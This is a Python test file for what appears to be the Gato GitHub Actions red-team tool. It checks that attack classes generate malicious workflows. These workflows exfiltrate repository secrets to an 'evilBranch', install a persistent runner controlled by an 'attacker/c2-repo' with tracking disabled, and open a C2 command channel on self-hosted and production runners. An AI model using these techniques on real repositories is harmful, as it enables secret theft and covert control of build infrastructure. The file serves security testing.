from gato.attack import CICDAttack, Attacker


def test_create_malicious_yaml():
    """Test code to create a malicious yaml file
    """
    attacker = CICDAttack()
    yaml = attacker.create_malicious_yml("whoami")

    assert "run: whoami" in yaml


def test_create_malicious_push_yaml():
    """Test code to create a malicious yaml file
    """
    attacker = CICDAttack()
    yaml = attacker.create_push_yml("whoami", "testing")

    assert "run: whoami" in yaml


def test_create_malicious_wf_name():
    """Test code to create a malicious yaml file
    """
    attacker = CICDAttack()
    yaml = attacker.create_malicious_yml("ip a", workflow_name="Foobar")

    assert "run: ip a" in yaml
    assert "Foobar" in yaml


def test_create_secret_exil_yaml():
    """Test code to create a yaml to exfil repository secrets.
    """
    attacker = CICDAttack()

    # Just use the util method to get our key.
    priv, pub = Attacker._Attacker__create_private_key()

    yaml = attacker.create_exfil_yaml(
        ["SECRET_ONE", "SECRET_TWO"], pub, "evilBranch"
    )

    assert "SECRET_ONE: ${{ secrets.SECRET_ONE }}" in yaml
    assert "SECRET_TWO: ${{ secrets.SECRET_TWO }}" in yaml
    assert "echo -e \"SECRET_ONE=$SECRET_ONE\n" in yaml


def test_create_ror_yml():
    """Test RoR runner installation workflow generation."""
    attacker = CICDAttack()
    yaml_out = attacker.create_ror_yml(
        'FAKE_TOKEN_123', 'attacker/c2-repo', '2.321.0', 'ror-branch'
    )

    assert 'uname -m' in yaml_out
    assert 'actions-runner-linux' in yaml_out
    assert '2.321.0' in yaml_out
    assert 'FAKE_TOKEN_123' in yaml_out
    assert 'attacker/c2-repo' in yaml_out
    assert 'gato-ror' in yaml_out
    assert '--disableupdate' in yaml_out
    assert '--unattended' in yaml_out
    assert 'setsid ./run.sh' in yaml_out
    assert 'unset RUNNER_TRACKING_ID' in yaml_out
    assert 'ror-branch' in yaml_out


def test_create_malicious_yml_runner_labels():
    """Test runner label targeting in malicious yml."""
    attacker = CICDAttack()
    yaml_out = attacker.create_malicious_yml(
        "whoami", runner_labels=['self-hosted', 'Linux', 'gpu-builder']
    )
    assert 'self-hosted' in yaml_out
    assert 'gpu-builder' in yaml_out


def test_create_push_yml_runner_labels():
    """Test runner label targeting in push yml."""
    attacker = CICDAttack()
    yaml_out = attacker.create_push_yml(
        "whoami", "test-branch",
        runner_labels=['self-hosted', 'production']
    )
    assert 'production' in yaml_out


def test_create_c2_dispatch_yml():
    """Test C2 workflow_dispatch YAML generation."""
    attacker = CICDAttack()
    yaml_out = attacker.create_c2_dispatch_yml()

    assert 'workflow_dispatch' in yaml_out
    assert 'command' in yaml_out
    assert 'gato-ror' in yaml_out
    assert 'self-hosted' in yaml_out
    assert 'github.event.inputs.command' in yaml_out
